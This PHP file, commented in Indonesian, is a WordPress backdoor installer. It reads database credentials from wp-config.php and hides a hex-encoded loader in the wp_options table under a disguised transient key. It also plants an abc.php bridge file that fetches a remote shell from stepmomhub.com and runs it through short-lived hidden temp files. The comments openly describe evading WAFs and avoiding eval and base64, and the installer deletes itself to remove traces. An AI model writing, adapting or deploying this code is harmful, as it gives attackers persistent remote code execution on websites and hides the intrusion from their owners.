<?php
// ==========================================
// INSTALLER BERSIH (HEX METHOD)
// ==========================================
// Tidak ada base64 di sini.
// Payload kita simpan dalam format HEXADECIMAL agar aman dari WAF saat insert DB.

// 1. CONFIG
$filename = 'abc.php';
$db_key   = 'transient_sys_pma_check';
$remote   = 'https://stepmomhub.com/77.txt';

// 2. SIAPKAN PAYLOAD (YANG AKAN DISIMPAN DI DB)
// Payload ini JUGA tidak menggunakan eval.
// Dia mendownload shell -> Simpan ke file temp -> Include -> Hapus.
$payload_source = '<?php
// Silent
@error_reporting(0); @ini_set("display_errors",0);

// Download Remote Shell
$u="' . $remote . '";
$c=curl_init($u);
curl_setopt($c,19913,1); curl_setopt($c,52,1); curl_setopt($c,64,0);
$d=curl_exec($c);
if(!$d) $d=@file_get_contents($u);

// EKSEKUSI TANPA EVAL
if($d){
    // 1. Tentukan lokasi file temp (Gunakan folder upload/cache biar writable)
    $tmp = sys_get_temp_dir() . "/wp_sys_temp_" . md5(time()) . ".php";
    
    // 2. Pastikan ada tag PHP
    if(strpos($d, "<?php") === false) $d = "<?php " . $d;
    
    // 3. Tulis - Include - Hapus
    if(file_put_contents($tmp, $d)){
        include($tmp);
        unlink($tmp); // Hapus jejak
    }
}
?>';

// Ubah ke HEX agar aman masuk database (Bukan Base64)
$payload_hex = bin2hex($payload_source);

// 3. BACA WP-CONFIG
$c = file_get_contents('wp-config.php');

// Helper Regex Sederhana
function _g($k, $s){
    if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i', $s, $m)) return $m[1];
    return '';
}

$n = _g('DB_NAME', $c);
$u = _g('DB_USER', $c);
$p = _g('DB_PASSWORD', $c);
$h = _g('DB_HOST', $c);

// Prefix
$x = 'wp_';
if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i', $c, $m)) $x = $m[1];

if($n){
    // 4. KONEKSI & INJEKSI DB
    $m = new mysqli($h, $u, $p, $n);
    if(!$m->connect_error){
        // Hapus lama
        $m->query("DELETE FROM {$x}options WHERE option_name='$db_key'");
        // Insert Baru (Isi kolom autoload='no' agar tidak memberatkan WP)
        $q = "INSERT INTO {$x}options (option_name, option_value, autoload) VALUES ('$db_key', '$payload_hex', 'no')";
        if($m->query($q)){
            echo "[OK] Payload (Hex) tersimpan di Database.<br>";
        } else {
            echo "[FAIL] DB Error: " . $m->error . "<br>";
        }
    }
}

// 5. BUAT FILE FISIK abc.php (NO BASE64, NO EVAL)
// Kita tulis kodingan PHP murni menggunakan HEREDOC syntax.
// File ini akan membaca HEX dari DB, mengubahnya jadi biner, simpan ke file, lalu include.

$bridge_code = <<<'PHP'
<?php
error_reporting(0);
// Baca Config
$c = file_get_contents('wp-config.php');

// Regex Helper (Kutip Satu Aman)
function _f($k, $s){
    if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i', $s, $m)) return $m[1];
    return '';
}

$n = _f('DB_NAME', $c);
$u = _f('DB_USER', $c);
$p = _f('DB_PASSWORD', $c);
$h = _f('DB_HOST', $c);

$x = 'wp_';
if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i', $c, $m)) $x = $m[1];

if($n){
    $m = new mysqli($h, $u, $p, $n);
    if(!$m->connect_error){
        // Ambil Payload Hex
        $q = $m->query("SELECT option_value FROM {$x}options WHERE option_name='transient_sys_pma_check' LIMIT 1");
        if($q && $r=$q->fetch_assoc()){
            
            // 1. Decode Hex (Bukan Base64) -> Jadi PHP Code Asli
            $code = hex2bin($r['option_value']);
            
            // 2. Teknik Bypass Eval: WRITE & INCLUDE
            // Kita buat file sementara di folder yang sama (hidden file)
            $tmp_file = dirname(__FILE__) . '/.sys_cache_' . md5($h) . '.php';
            
            if(file_put_contents($tmp_file, $code)){
                // Jalankan File
                include($tmp_file);
                
                // Hapus File Seketika (Self-Cleaning)
                unlink($tmp_file);
            }
        }
    }
}
?>
PHP;

if(file_put_contents($filename, $bridge_code)){
    echo "[OK] File <b>$filename</b> berhasil dibuat.<br>";
    echo "Fitur: No-Base64, No-Eval, Hex-Storage.<br>";
    echo "<br>Silakan akses: <b><a href='$filename'>$filename</a></b>";
} else {
    echo "Gagal menulis file.";
}

unlink(__FILE__);
?>
